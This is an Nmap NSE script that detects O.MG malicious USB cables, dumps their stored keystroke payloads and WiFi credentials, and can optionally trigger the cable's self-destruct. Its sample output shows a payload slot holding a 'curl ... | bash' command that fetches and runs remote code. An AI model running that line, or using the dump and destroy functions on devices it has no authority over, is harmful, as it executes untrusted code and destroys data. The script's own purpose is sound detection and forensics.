local shortport = require "shortport"
local stdnse = require "stdnse"

description = [[
Detects whether the given host(s) is a O.MG cable. Remote dumps deployed payloads
and flash regions with persistent user data (WiFi credentials etc).
The optional script-arg 'http-omgcable.destroy' additionally triggers the self-destruct 
functionality of the cable (not done by default).
]]

---
-- @usage
-- nmap -p 80 --script http-omgcable <target>
-- nmap -p 80 --script http-omgcable --script-args 'http-omgcable.destroy' <target>

--
-- @output
-- PORT     STATE  SERVICE
-- 80/tcp   open   http
-- | http-omgcable: O.MG cable detected
-- | 
-- | 
-- | boot payload enabled (x 01 00 00 00 if enabled)
-- | -----------------------------------------------
-- | 0007F800  FF FF FF FF                                       ....
-- | 
-- | boot payload (encoded in binary triplets [cmd,mod,key])
-- | -------------------------------------------------------
-- | EMPTY
-- | 
-- | payload slot 1
-- | --------------------
-- | STRING curl -sL decoded.tk/x|bash
-- | ENTER
-- | 
-- | payload slot 2
-- | --------------------
-- | EMPTY
-- | 
-- | payload slot 3
-- | --------------------
-- | STRING this is the content of payload slot 3
-- | 
-- | IP addr
-- | --------------------
-- | 000B0000  FF FF FF FF                                       ....
-- | 
-- | 
-- | user data section 1
-- | --------------------
-- | 000FD000  FF FF FF FF FF FF FF FF  02 FF FF FF FF FF FF FF  ................
--        ... snip ...
-- | 000FD090  FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
-- | 000FD0A0  FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
-- | 000FD0B0  0A 00 00 00 4F 2E 4D 47  2D 43 61 62 6C 65 00 00  ....O.MG-Cable..
-- | 000FD0C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
-- | 000FD0D0  00 00 00 00 31 32 33 34  35 36 37 38 00 00 00 00  ....12345678....
--        ... snip ...
-- | 
-- | 
-- | user data section 2
-- | --------------------
-- | 000FE000  FF FF FF FF FF FF FF FF  02 FF FF FF FF FF FF FF  ................
--        ... snip ...
-- | 000FE260  FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
-- | 
-- | 
-- | send destroy command to cable...
-- |_...done
--
-- @args http-omgcable.destroy - Trigger self-destruct function of the cable after enumeration.
--
author = "Marcus Mengs (mame82)"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = { "default", "discovery", "safe" }

portrule = shortport.http

-- add tohex function to string
function string.tohex(str)
    return (str:gsub('.', function (c)
        return string.format('%02X', string.byte(c))
    end))
end

function hex_dump(buf, offset)
	res = ""
	for i=1,math.ceil(#buf/16) * 16 do
		if (i-1) % 16 == 0 then res = res .. (string.format('%08X  ', i-1 + offset)) end
		res = res .. ( i > #buf and '   ' or string.format('%02X ', buf:byte(i)) )
		if i %  8 == 0 then res = res .. (' ') end
		if i % 16 == 0 then res = res .. ( buf:sub(i-16+1, i):gsub('[^%g]','.') .. '\n' ) end
	end
	return res
end

function truncate_null(s)
	  local match = string.match(s,"(.*)%z")
	  if match ~= nil then
		return match
	  else
		return ""
	  end
end

---
-- simplyfied version of websocket frame encoder, with following limitations
--
-- - doesn't encode paylods with len > 126 (fine for O.MG API)
-- - always encode with opcode 0x1 (Text)
-- - sets mask bit, but uses all 0x00 mask (easy to follow captures, no XOR encoding required)
--
-- As scope is O.MG cable WS API only, those limitations are fine and ease up packet captures
---
function ws_encode(payload)
	-- construct WS frame 
	payload = string.sub(payload, 1, 126) -- trim payload to length 126 if longer

	request = "\x81" -- Final fragment, opcode 'Text'
	mask_len = string.len(payload)
	mask_len = mask_len | 0x80 -- set mask bit
	request = request .. string.char(mask_len)
	request = request .. "\x00\x00\x00\x00" -- use all zero mask (umasked, but mask bit set)
	request = request .. payload -- apend unmasked payload
	return request
end

function ws_decode(payload)
	result = ""
	if string.len(payload) < 2 then
		-- malformed payload
		return result
	end

	-- only decode binary frames (opcode 0x2) with FIN bit set (0x80)
	if string.byte(payload,1) ~= 0x82 then
		print("wrong opcode")
		return result
	end

	-- check if response is masked, ignore payload if that's the case
	if (string.byte(payload,2) & 0x80) == 0x80 then
		print("no decoding support for masked WS payloads")
		return result
	end

	-- extract length
	len = string.byte(payload,2) & 0x7f

	-- check if extra long payload (len field == 127)
	if len == 127 then
		print("no decoding support for extra long WS payloads")
		return result
	end



	paystart = 3 -- indexing starts with 1, not 0
	-- if length is 126, consume next two bytes as extended length field
	if len == 126 then
		len = string.byte(payload,3) << 8
		len = len + string.byte(payload,4)
		paystart = paystart + 2
	end

	-- extract substring
	result = string.sub(payload, paystart, paystart + len)
	return result
end

function api_request(s, cmd, ...)
	payload = cmd
	for i,v in ipairs({...}) do
        payload = payload .. "\t" .. tostring(v)
	end

	request = ws_encode(payload)

	--print("API REQUEST: " .. (request))

	status, err = s:send(request)
	status, response = s:receive_bytes(0)
	dec = ws_decode(response)
	--print("API RESPONSE decoded: " .. string.tohex(dec))

	return dec
end

function api_cmd_no_rsp(s, cmd, ...)
	payload = cmd
	for i,v in ipairs({...}) do
        payload = payload .. "\t" .. tostring(v)
	end

	request = ws_encode(payload)
	status, err = s:send(request)

	return dec
end

function api_request_strip_rsp(s, cmd, ...)
	payload = cmd
	for i,v in ipairs({...}) do
        payload = payload .. "\t" .. tostring(v)
	end

	request = ws_encode(payload)

	--print("API REQUEST: " .. (request))

	status, err = s:send(request)
	status, response = s:receive_bytes(0)
	dec = ws_decode(response)
	--print("API RESPONSE decoded: " .. string.tohex(dec))

	-- check if first part of the response matches the request
	if string.find(dec, payload) == nil then -- additional check if substring is at beginning of response should be added
		--print("REQUEST MISSING")
		return ""
	end
	return string.sub(dec, string.len(payload) + 2) -- remove '\t' prefix
end

function api_echo_test(s)
	req = "e"
	rsp = api_request(s,req)
	return rsp == req
end

function api_read_flash(s, offset, length)
	req = "FR" .. string.format("%08d",offset)
	rsp = api_request_strip_rsp(s,req,string.format("%04d",length))


	return rsp
end

function api_destroy(s)
	req = "CD1"
	rsp = api_cmd_no_rsp(s,req)

	return rsp
end

function dump_sections_of_interest(socket)
	output = "\n"
	output = output .. "boot payload enabled (x 01 00 00 00 if enabled)\n"
	output = output .. "-----------------------------------------------\n"
	offset = 0x7f800
	rsp = api_read_flash(socket, offset, 4)
	output = output .. hex_dump(rsp, offset)

	offset = 0x7f810
	rsp = api_read_flash(socket, offset, 1024)
	rsp = truncate_null(rsp)
	if #rsp == 0 then rsp = "EMPTY" end
	output = output .. "\n"
	output = output .. "boot payload (encoded in binary triplets [cmd,mod,key])\n"
	output = output .. "-------------------------------------------------------\n"
	output = output .. rsp
	output = output .. "\n"

	offset = 0xa9000
	rsp = api_read_flash(socket, offset, 1024)
	rsp = truncate_null(rsp)
	if #rsp == 0 then rsp = "EMPTY" end
	output = output .. "\n"
	output = output .. "payload slot 1\n"
	output = output .. "--------------------\n"
	output = output .. rsp
	output = output .. "\n"

	offset = 0xaa000
	rsp = api_read_flash(socket, offset, 1024)
	rsp = truncate_null(rsp)
	if #rsp == 0 then rsp = "EMPTY" end
	output = output .. "\n"
	output = output .. "payload slot 2\n"
	output = output .. "--------------------\n"
	output = output .. rsp
	output = output .. "\n"

	offset = 0xab000
	rsp = api_read_flash(socket, offset, 1024)
	rsp = truncate_null(rsp)
	if #rsp == 0 then rsp = "EMPTY" end
	output = output .. "\n"
	output = output .. "payload slot 3\n"
	output = output .. "--------------------\n"
	output = output .. rsp
	output = output .. "\n"

	offset = 0xb0000
	rsp = api_read_flash(socket, offset, 4)
	output = output .. "\n"
	output = output .. "IP addr\n"
	output = output .. "--------------------\n"
	output = output .. hex_dump(rsp, offset)
	output = output .. "\n"

	offset = 0xfd000
	rsp = api_read_flash(socket, offset, 0x270)
	output = output .. "\n"
	output = output .. "user data section 1\n"
	output = output .. "--------------------\n"
	output = output .. hex_dump(rsp, offset)
	output = output .. "\n"

	offset = 0xfe000
	rsp = api_read_flash(socket, offset, 0x270)
	output = output .. "\n"
	output = output .. "user data section 2\n"
	output = output .. "--------------------\n"
	output = output .. hex_dump(rsp,offset)
	output = output .. "\n"

	---
-- 0xa9000			pay slot 1
-- 0xaa000			pay slot 2
-- 0xab000			pay slot 3
-- 0xfd000/0xfe000		current config
---

	return output
end

action = function(host, port)
	local status, err, response
	local socket = nmap.new_socket()

	local destroy = stdnse.get_script_args('http-omgcable.destroy')


	socket:connect(host.ip, port)
	status, err = socket:send("GET /d/ws/issue HTTP/1.1\r\n" ..
	  "Host: " .. stdnse.get_hostname(host) .. "\r\n" ..
	  "Connection: Upgrade\r\n" ..
	  "Upgrade: websocket\r\n" ..
	  "Connection: Upgrade\r\n" ..
	  "Sec-WebSocket-Key: g99NCU1l1XVuEPUXsc2u5w==\r\n" ..
	  "Sec-WebSocket-Version: 13\r\n\r\n")
	status, response = socket:receive_bytes(0)


--	  api_request(socket, "FR00692224", 1280)
	
	if response:find("Web Socket Protocol Handshake") or response:find("101 Switching Protocols") then
	  total_len = string.len(response)
	  if api_echo_test(socket) then
		output = ""

		output = output .. "O.MG cable detected\n\n"

		output = output .. dump_sections_of_interest(socket)

		if destroy then
			output = output .. "\nsend destroy command to cable...\n"
			rsp = api_destroy(socket)
			output = output .. "...done\n"
		end

		return output
	  else
		return 
	  end
	end
end
